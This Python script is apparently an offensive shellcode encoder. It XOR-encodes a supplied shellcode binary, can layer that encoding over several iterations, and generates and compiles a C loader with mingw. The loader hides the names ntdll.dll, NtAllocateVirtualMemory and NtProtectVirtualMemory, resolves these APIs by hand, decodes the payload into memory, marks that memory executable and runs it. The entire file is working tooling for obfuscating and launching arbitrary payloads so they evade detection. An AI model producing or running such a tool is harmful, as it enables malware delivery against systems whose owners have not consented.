import os
import sys
import subprocess
import random

if len(sys.argv) < 3:
    script_name = os.path.basename(sys.argv[0])
    print(f"Usage: {script_name} <shellcode.bin> <output.bin> [-l <key_length>] [-k <key>] [-i <iterations>]")
    sys.exit(1)

bin_file = sys.argv[1]
output_bin = sys.argv[2]

key_length = 1
iterations = 1

if "-l" in sys.argv:
    l_index = sys.argv.index("-l")
    key_length = int(sys.argv[l_index + 1])
    if key_length not in (1, 2):
        print("Error: key length must be 1 or 2 bytes")
        sys.exit(1)

if "-i" in sys.argv:
    i_index = sys.argv.index("-i")
    iterations = int(sys.argv[i_index + 1])
    if iterations < 1:
        print("Error: iterations must be >= 1")
        sys.exit(1)

if "-k" in sys.argv:
    k_value = sys.argv[sys.argv.index("-k") + 1]
    if "," in k_value:
        fixed_key = [int(b, 0) for b in k_value.split(",")]
    elif k_value.startswith("0x") and len(k_value) > 2:
        hex_str = k_value[2:]
        if len(hex_str) % 2 != 0:
            hex_str = "0" + hex_str
        fixed_key = [int(hex_str[i:i+2], 16) for i in range(0, len(hex_str), 2)]
    else:
        fixed_key = [int(k_value, 0)]
    if len(fixed_key) not in (1, 2):
        print("Error: key length must be 1 or 2 bytes")
        sys.exit(1)
    key_length = len(fixed_key)
else:
    fixed_key = None

with open(bin_file, "rb") as f:
    current_shellcode = f.read()

def xor_bytes(data: bytes, key: list[int]) -> bytes:
    return bytes(data[i] ^ key[i % len(key)] for i in range(len(data)))

def xor_c_string(s: str, key: list[int]) -> bytes:
    return xor_bytes(s.encode() + b'\x00', key)

def bytes_to_c_array(b: bytes) -> str:
    return ",".join(f"0x{byte:02x}" for byte in b)

for i in range(iterations):
    key = fixed_key if fixed_key else [random.randint(1, 255) for _ in range(key_length)]

    c_strings = ["ntdll.dll", "NtAllocateVirtualMemory", "NtProtectVirtualMemory"]
    xor_shellcode = xor_bytes(current_shellcode, key)
    xor_c_strings = [xor_c_string(s, key) for s in c_strings]

    offsets = []
    current_offset = 0
    for s in xor_c_strings:
        offsets.append(current_offset)
        current_offset += len(s)
    stackbuf_size = current_offset

    shellcode_array = bytes_to_c_array(xor_shellcode)
    combined_array = bytes_to_c_array(b"".join(xor_c_strings))
    key_array = bytes_to_c_array(key)

    c_code = f'''#include "winapi_loader.h"

typedef NTSTATUS (NTAPI *NtAllocateVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS (NTAPI *NtProtectVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

__attribute__((section(".text"))) static unsigned char shellcode[] = {{ {shellcode_array} }};
__attribute__((section(".text"))) static unsigned char enc_strings[] = {{ {combined_array} }};
__attribute__((section(".text"))) static unsigned char key[] = {{ {key_array} }};
    
__attribute__((section(".text.start")))
void _start() {{
    SIZE_T size = sizeof(shellcode);
    SIZE_T key_len = sizeof(key);

    unsigned char stackbuf[{stackbuf_size}];
    for (SIZE_T i = 0; i < sizeof(enc_strings); i++)
        stackbuf[i] = enc_strings[i] ^ key[i % key_len];

    char* ntdll_dll = (char*)&stackbuf[{offsets[0]}];
    HMODULE hNtdll = myGetModuleHandleA(ntdll_dll);

    char* ntallocatevirtualmemory = (char*)&stackbuf[{offsets[1]}];
    NtAllocateVirtualMemory_t pNtAllocateVirtualMemory =
        (NtAllocateVirtualMemory_t)myGetProcAddress(hNtdll, ntallocatevirtualmemory);

    LPVOID execMemory = NULL;
    SIZE_T regionSize = size;
    pNtAllocateVirtualMemory(
        (HANDLE)-1,
        &execMemory,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    for (SIZE_T i = 0; i < size; i++)
        ((unsigned char*)execMemory)[i] = shellcode[i] ^ key[i % key_len];

    char* ntprotectvirtualmemory = (char*)&stackbuf[{offsets[2]}];
    NtProtectVirtualMemory_t pNtProtectVirtualMemory =
        (NtProtectVirtualMemory_t)myGetProcAddress(hNtdll, ntprotectvirtualmemory);

    ULONG oldProtect;
    pNtProtectVirtualMemory(
        (HANDLE)-1,
        &execMemory,
        &regionSize,
        PAGE_EXECUTE_READ,
        &oldProtect
    );

    ((void(*)())execMemory)();
}}'''

    temp_exe = "temp_loader.exe"
    compile_cmd = [
        "x86_64-w64-mingw32-gcc",
        "-nostdlib", "-nostartfiles",
        "-e", "_start",
        "-Os", "-s", "-fno-ident",
        "-fno-asynchronous-unwind-tables",
        "-mno-stack-arg-probe",
        "-T", "linker.ld", "-DXOR",
        "-x", "c", "-", "-o", temp_exe
    ]

    proc = subprocess.run(compile_cmd, input=c_code.encode(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    if proc.returncode != 0:
        print(proc.stderr.decode())
        sys.exit(1)

    objcopy_cmd = [
        "objcopy",
        "-O", "binary",
        "--only-section=.text",
        temp_exe,
        output_bin
    ]

    proc = subprocess.run(objcopy_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    os.remove(temp_exe)
    if proc.returncode != 0:
        print(proc.stderr.decode())
        sys.exit(1)

    if iterations == 1:
        print(f"[+] Shellcode generated: {output_bin} (XOR key: {key_array})")
    else:
        print(f"[*] Iteration {i+1}/{iterations} - XOR key: {key_array}")

    with open(output_bin, "rb") as f:
        current_shellcode = f.read()

if iterations > 1:
    print(f"[+] Shellcode generated: {output_bin}")
